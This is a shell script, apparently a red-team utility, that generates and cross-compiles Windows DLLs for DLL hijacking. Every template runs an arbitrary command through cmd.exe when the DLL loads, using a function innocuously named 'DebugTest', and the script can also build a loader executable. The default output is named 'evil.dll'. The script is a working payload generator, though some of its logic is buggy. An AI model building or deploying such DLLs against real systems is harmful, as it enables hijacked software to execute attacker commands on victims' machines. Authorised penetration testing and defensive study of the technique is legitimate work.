#!/bin/sh

usage(){
        echo "# #################                Simple CPP to DLL Utility               ################# #"
        echo "# This tool has been maded to easily generate and compile a DLL to be used for DLL hijacking.#"
        echo "#                                                                                            #"
        echo "# ========================================================================================== #"
        echo "#                                                                                            #"
        echo "# Usage:                                                                                     #"
        echo "#   ./dll-gcc [Options] <input-file>                                                         #"
        echo "# Options:                                                                                   #"
        echo "#   -c: command to execute upon attach                                                       #"
        echo "#   -o: final DLL name (default: 'evil.dll')                                                 #"
        echo "#   -i: injection point [1:dllmain, 2:process_attach, 3:thread_attach](default: 1)           #"
        echo "#   -g: generate cpp file (default: False)                                                   #"
        echo "#   -l: generate loader EXE as '<dll-basename>.exe' (default: False)                         #"
        echo "#                                                                                            #"
        echo "# ========================================================================================== #"
        exit 0
}

beginswith() { case $2 in "$1"*) true;; *) false;; esac; }

endswith() { case $2 in *"$1") true;; *) false;; esac; }

compile_dll(){
        fname=$(echo "$1" | sed 's/.cpp$//g')
        basename=$(echo "$1" | sed 's/.cpp$//g' | awk -F "/" '{print $NF}')
        dll="$2"
        i686-w64-mingw32-g++.exe -c -DBUILDING_EXAMPLE_DLL "$fname.cpp" &>/dev/null
        i686-w64-mingw32-g++ -shared -o "$dll" "/tmp/$basename.o" -Wl,--subsystem,windows,--out-implib,"/tmp/$basename.a" &>/dev/null
        rm "/tmp/$basename.a"
        rm "$fname.cpp"
}

compile_exe(){
        basename=$(echo "$2" | sed 's/.dll$//g' | awk -F "/" '{print $NF}')
        i686-w64-mingw32-g++.exe -DBUILDING_LOADER "$1" -o "$old/$basename.exe" &>/dev/null
}

write_cpp_ddlmain(){
        cmd="$1"
        cpp="$2"
        echo "
#include <windows.h>
void DebugTest()
{
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	if (CreateProcess(\"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"/c $cmd\", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo)) {
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
	DebugTest();
	return 0;
}
" > "$cpp"
}

write_cpp_process_attach(){
        cmd="$1"
        cpp="$2"
        echo "
#include <windows.h>
void DebugTest()
{
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	if (CreateProcess(\"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"/c $cmd\", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo)) {
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
switch( fdwReason )
{
	case DLL_PROCESS_ATTACH:
		DebugTest();
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		break;
}
return TRUE;
}
" > "$cpp"
}

write_cpp_thread_attach(){
        cmd="$1"
        cpp="$2"
        echo "
#include <windows.h>
void DebugTest()
{
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	if (CreateProcess(\"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"/c $cmd\", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo)) {
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
switch( fdwReason )
{
	case DLL_PROCESS_ATTACH:
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		DebugTest();
		break;

	case DLL_PROCESS_DETACH:
		break;
}
return TRUE;
}
" > "$cpp"
}

write_cpp_loader(){
        dll="$1"
        cpp="$2"
        echo "
#include <windows.h>

int main()                
{
	HANDLE h;

	h = LoadLibrary(\"$dll\");
	if(h){
		FreeLibrary(LoadLibrary(\"$dll\"));
	}
	return 0;
}
                
" > "$cpp"

}
old="$(pwd)"
CPPFILE="$(mktemp /tmp/XXXXXXXXX.cpp)"
CPPLOADERFILE="$(mktemp /tmp/XXXXXXXXX.cpp)"
DLLFILE="$old/evil.dll"
INJECTION=1
LOADER=0

if [ $# -lt 1 ]; then
        usage
fi

while (( "$#" )); do
#while true; do
    case "$1" in
        -h|--help)
        usage
        break
        ;;
    -c|--command)
        cmd="$2"
        shift 2
        ;;
    -o|--outdll)
        DLLFILE="$2"
        shift 2
        ;;
    -g|--generate)
        generate=1
        shift 1
        ;;
    -l|--loader)
        LOADER=1
        shift 1
        ;;
    -i|--injection-point)
        if [ "$2" -le 3 ] && [ "$2" -gt 0 ]; then
            INJECTION="$2"
        fi
        shift 2
        ;;
    --) # end argument parsing
        shift
        break
        ;;
    -*|--*) # unsupported flags
        echo  "Error: Unsupported flag $1" >&2
        exit 1
        ;;
    *) # preserve positional arguments
        if [ -n "$PARAMS" ]
        then
            FILE="$1"
        fi
        shift
        ;;
    esac
done

# set positional arguments in their proper place
eval set -- "$PARAMS"

cd "/tmp"

if [ "$generate" -eq 0 ]; then
    if [ ! -f "$FILE" ]; then
        echo "[!] No input file"
        usage
    fi

    if ! endswith ".cpp" "$FILE"; then
        echo "[!] The input file extension seems to be wrong (only cpp are allowed)"
        usage
    fi
fi

if [ "$generate" -gt 0 ] && [ -n "$cmd" ]; then

    printf "[*] Generating CPP File using Injection Point: "
    if [ $INJECTION -eq 1 ]; then
        printf "DllMain"
        write_cpp_ddlmain "$cmd" "$CPPFILE"
    elif [ $INJECTION -eq 2 ]; then
        printf "PROCESS_ATTACH"
        write_cpp_process_attach "$cmd" "$CPPFILE"
    else
        printf "THREAD_ATTACH"
        write_cpp_thread_attach "$cmd" "$CPPFILE"
    fi
    echo "... Done."
else
    echo "[!] No command specified"
    usage
fi
    
if [ "$LOADER" -gt 0 ]; then
    printf "[*] Generating loader... "
    write_cpp_loader "$DLLFILE" "$CPPLOADERFILE"
    echo " Done."
fi

if [ -f "$CPPFILE" ]; then
    printf "[*] Compiling..."
    compile_dll "$CPPFILE" "$DLLFILE"
    echo " Done."
else
    echo "[-] No CPP file found"
fi

if [ ! -f "$DLLFILE" ]; then
	echo "[-] DLL not generated!"
	exit 1
else
	mv "$DLLFILE" "$old/$DLLFILE"
fi

if [ -f "$CPPLOADERFILE" ]; then
    printf "[*] Compiling loader... %s %s " "$CPPLOADERFILE" "$DLLFILE"
    compile_exe "$CPPLOADERFILE" "$DLLFILE"
    echo " Done."
else
    echo "[-] No CPP Loader file found"
fi


cd "$old"
echo "[+] Thanks for using the tool. Bye!"
